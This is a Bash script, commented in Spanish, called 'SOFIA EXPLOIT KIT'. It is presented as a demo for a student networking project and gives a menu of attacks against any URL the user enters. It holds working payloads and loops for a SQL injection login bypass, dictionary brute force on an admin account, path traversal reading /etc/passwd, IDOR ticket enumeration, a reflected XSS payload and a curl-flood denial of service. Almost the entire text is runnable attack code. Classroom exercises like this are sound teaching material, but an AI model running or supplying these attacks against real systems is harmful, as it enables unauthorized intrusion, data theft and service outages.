#!/bin/bash

# SOFIA EXPLOIT KIT - Linux/Codespaces Version
# Uso: chmod +x sofia-tool.sh && ./sofia-tool.sh

show_header() {
    clear
    echo -e "\e[36m==========================================================\e[0m"
    echo -e "\e[36m         SOFIA SOLUTIONS - EXPLOIT KIT v1.0              \e[0m"
    echo -e "\e[36m==========================================================\e[0m"
    echo -e "\e[90m  Herramienta de demostración para el proyecto final ASIX \e[0m"
    echo -e "\e[36m==========================================================\n\e[0m"
}

if [ -z "$1" ]; then
    show_header
    echo -n "Ingresa la URL del objetivo (ej: https://xxx.trycloudflare.com): "
    read targetUrl
else
    targetUrl=$1
fi

# Ajustar protocolo
[[ $targetUrl != http* ]] && targetUrl="http://$targetUrl"
targetUrl="${targetUrl%/}"

while true; do
    show_header
    echo -e "Objetivo Actual: \e[33m$targetUrl\e[0m\n"
    echo "Selecciona el ataque que deseas ejecutar:"
    echo "1. [SQLi] Bypass de Login (Inyección SQL)"
    echo "2. [BRUTE] Ataque de Fuerza Bruta (Diccionario)"
    echo "3. [PATH] Path Traversal (Lectura de archivos sensibles)"
    echo "4. [IDOR] Insecure Direct Object Reference (Ver otros tickets)"
    echo "5. [XSS] Cross-Site Scripting (Inyección de Script)"
    echo "6. [DoS] Denegación de Servicio (Stress Test)"
    echo "7. Cambiar URL Objetivo"
    echo "8. Salir"
    echo ""
    echo -n "Opción: "
    read choice

    case $choice in
        1)
            echo -e "\n\e[33m[!] Iniciando SQL Injection contra /api/auth/login...\e[0m"
            curl -X POST "$targetUrl/api/auth/login" \
                 -H "Content-Type: application/json" \
                 -d '{"email": "'\'' OR '\''1'\''='\''1", "password": "any"}'
            echo -e "\n\e[32m[DONE] Petición enviada.\e[0m"
            ;;
        2)
            echo -e "\n\e[33m[!] Iniciando Brute Force...\e[0m"
            passwords=("123456" "password" "admin" "S0f1a_Secur3!_2026" "qwerty")
            for pass in "${passwords[@]}"; do
                echo -n "Probando: $pass -> "
                status=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$targetUrl/api/auth/login" \
                        -H "Content-Type: application/json" \
                        -d "{\"email\": \"admin@sofia.local\", \"password\": \"$pass\"}")
                if [ "$status" == "200" ]; then
                    echo -e "\e[32m[EXITO]\e[0m"
                    break
                else
                    echo -e "\e[31m[FALLO]\e[0m"
                fi
            done
            ;;
        3)
            echo -n -e "\n¿Qué archivo quieres leer? (ej: ../../../etc/passwd): "
            read file
            echo -e "\e[33m[!] Intentando Path Traversal...\e[0m"
            curl -G "$targetUrl/api/files/read" --data-urlencode "path=$file"
            ;;
        4)
            echo -n -e "\nIngresa ID de Ticket (ej: 1023): "
            read ticketId
            echo -e "\e[33m[!] Probando IDOR...\e[0m"
            curl -X GET "$targetUrl/api/tickets/view/$ticketId"
            ;;
        5)
            echo -e "\n\e[33m[!] Payload XSS generado:\e[0m"
            echo -e "\e[36m$targetUrl/vulnerable/search?q=<script>alert('HACKED')</script>\e[0m"
            echo "Copia esto en tu navegador."
            ;;
        6)
            echo -e "\n\e[31m[!] Iniciando DoS durante 10 segundos...\e[0m"
            end=$((SECONDS+10))
            count=0
            while [ $SECONDS -lt $end ]; do
                curl -s "$targetUrl/api/health" > /dev/null
                count=$((count+1))
                [[ $((count % 10)) -eq 0 ]] && echo -n "."
            done
            echo -e "\n\e[32m[FIN] Se han enviado $count peticiones.\e[0m"
            ;;
        7)
            echo -n "Nueva URL Objetivo: "
            read targetUrl
            [[ $targetUrl != http* ]] && targetUrl="http://$targetUrl"
            targetUrl="${targetUrl%/}"
            ;;
        8) exit 0 ;;
        *) echo "Opción no válida." ;;
    esac
    echo -e "\nPresiona Enter para continuar..."
    read
done
